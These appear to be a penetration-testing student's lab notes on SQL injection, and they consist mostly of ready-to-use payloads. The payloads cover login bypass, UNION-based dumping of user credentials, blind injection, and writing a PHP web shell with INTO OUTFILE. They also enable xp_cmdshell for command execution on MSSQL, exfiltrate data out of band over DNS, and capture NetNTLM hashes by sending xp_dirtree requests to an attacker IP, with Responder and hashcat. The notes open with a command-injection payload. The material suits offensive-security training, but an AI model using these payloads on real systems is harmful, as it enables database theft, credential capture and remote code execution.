### Chapter 10: SQLi

FOR THE GIT CLONE UPLOAD EXERCISE
git clone <reverse shell>#
The # comments out the rest of the line
OR
make a curl post
curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.238.189:8000/archive






SQL was developed to manage and interact with data stored inside relational databases.

Modern web apps are designed around a front-end, or a user-facing interface created with HTML, jS and CSS.

The backend application layer runs on the server and can be PHP, Java, Python, ASP.NET, etc.

There are several types of SQL databases and the commands for each one vary.

Example of a simple query to parse the users table and retrieve a specific entry.

SELECT * FROM users WHERE user_name='spongebob'



SQL INJECTION

Force case to be true always:
SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 --

Identification using error-based payloads.

' or 1=1 in (select @@version) -- //
Returns a result within a truncated value error.

If the following returns a max columns error, we should query only one column at a time.
' OR 1=1 in (SELECT * FROM users) -- //

Identification using UNION-based payloads.

If the result of the query of an in-band application-returned value, we should test for UNION based SQLi.

UNION enables the executio of an extra SELECT, thus concatenating two queries into one statement.

To find out the exact number of columns in a table, we can use
' ORDER BY 1-- //
and increment the value until it fails.

Enumerate the db:
%' UNION SELECT database(), user(), @@version, null, null -- //

Dump the users table:
' UNION SELECT null, username, password, description, null FROM users -- //

Blind Injection:
 Out of band database, the responses are never returned and behavior is inferred using either boolean- or time-based logic.
 
 http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
 Since 1=1 will always be true, if the table returns values then we know the command worked.
 
 Here's a time-based blind injection:
 http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
 
Code Execution
In MSSQL, the xp_cmdshell function is useful. It must be enabled and then called with the EXECUTE keyword.
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth

In MySQL, we can use SELECT INTO_OUTFILE to write files onto the webserver.

' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //


Attack

Test for basic vulnerabilities in every possible entry point.
'
"
'=
'1=1
'-- bye
<script>alert(1)</script>
a'a'a
'),((.."), 
 UNION ALL SELECT NULL,NULL,database(),user(),version(),NULL#
 
 
 Boolean-based
Code: sql

' AND 1=1;--

Time-based
Code: sql

'; IF (1=1) WAITFOR DELAY '0:0:10';--

DNS OOB
SQL Function 	SQL Query
master..xp_dirtree 	DECLARE @T varchar(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_dirtree "\\'+@T+'.YOUR.DOMAIN\\x"');
master..xp_fileexist 	DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_fileexist "\\'+@T+'.YOUR.DOMAIN\\x"');
master..xp_subdirs 	DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_subdirs "\\'+@T+'.YOUR.DOMAIN\\x"');
sys.dm_os_file_exists 	DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM sys.dm_os_file_exists('\\'+@T+'.YOUR.DOMAIN\x');
fn_trace_gettable 	DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM fn_trace_gettable('\\'+@T+'.YOUR.DOMAIN\x.trc',DEFAULT);
fn_get_audit_file 	DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM fn_get_audit_file('\\'+@T+'.YOUR.DOMAIN\',DEFAULT,DEFAULT);
split result into sub-domains 	DECLARE @T VARCHAR(MAX); DECLARE @A VARCHAR(63); DECLARE @B VARCHAR(63); SELECT @T=CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), flag), 1) from flag; SELECT @A=SUBSTRING(@T,3,63); SELECT @B=SUBSTRING(@T,3+63,63); SELECT * FROM fn_get_audit_file('\\'+@A+'.'+@B+'.YOUR.DOMAIN\',DEFAULT,DEFAULT);
[MSSQL] RCE
Code: sql

-- Check if we are sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Enable 'Advanced Options'
EXEC sp_configure 'Show Advanced Options', '1';
RECONFIGURE;

-- Enable 'xp_cmdshell'
EXEC sp_configure 'xp_cmdshell', '1';
RECONFIGURE;

-- Ping ourselves
EXEC xp_cmdshell 'ping /n 4 192.168.43.164';

[MSSQL] NetNTLM

t0aster@htb[/htb]$ sudo python3 Responder.py -I eth0

Code: sql

EXEC master..xp_dirtree '\\<ATTACKER_IP>\myshare', 1, 1;

t0aster@htb[/htb]$ hashcat -m 5600 'jason::SQL01:bd7f162c24a39a0f:94DF80C5ABB...SNIP...000000' /usr/share/wordlists/rockyou.txt

[MSSQL] File Read
Code: sql

-- Check if we have the permissions needed to read files
SELECT COUNT(*) FROM fn_my_permissions(NULL, 'DATABASE') WHERE permission_name = 'ADMINISTER BULK OPERATIONS' OR permission_name = 'ADMINISTER DATABASE BULK OPERATIONS';

-- Get the length of a file
SELECT LEN(BulkColumn) FROM OPENROWSET(BULK '<path>', SINGLE_CLOB) AS x

-- Get the contents of a file
SELECT BulkColumn FROM OPENROWSET(BULK '<path>', SINGLE_CLOB) AS x




